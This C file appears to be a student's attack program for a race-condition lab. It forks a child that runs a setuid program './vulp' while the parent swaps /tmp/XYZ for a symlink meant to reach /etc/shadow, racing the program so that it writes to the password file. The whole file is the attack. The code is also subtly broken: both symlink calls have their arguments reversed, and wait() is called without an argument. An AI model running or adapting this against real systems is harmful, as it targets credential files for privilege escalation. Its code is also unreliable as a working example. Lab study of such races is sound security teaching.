//Race Condition Lab
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char** argv) {
    //char* payloadPath1 = "/home/seed/Labs/vulp/payload1.txt";
    //char* payloadPath2 = "/home/seed/Labs/vulp/payload2.txt";
    
    printf("Running '%s'\n", argv[0]);
    
    /*
    while(1) {
        unlink("/tmp/XYZ");
        symlink("/tmp/XYZ", "/etc/shadow");
    }
    */
    
    const char* xyz = "/tmp/XYZ";
    const char* shadow = "/etc/shadow";

    int pid = fork();
    if(pid == 0) {
        printf("Child executing vulp.\n");
        execvp("./vulp", argv);
    }
    else {
        wait();
        printf("Parent unlinking and symlinking.\n");
        unlink("/tmp/XYZ");
        symlink(xyz, shadow);
    }
    return 0;	
}
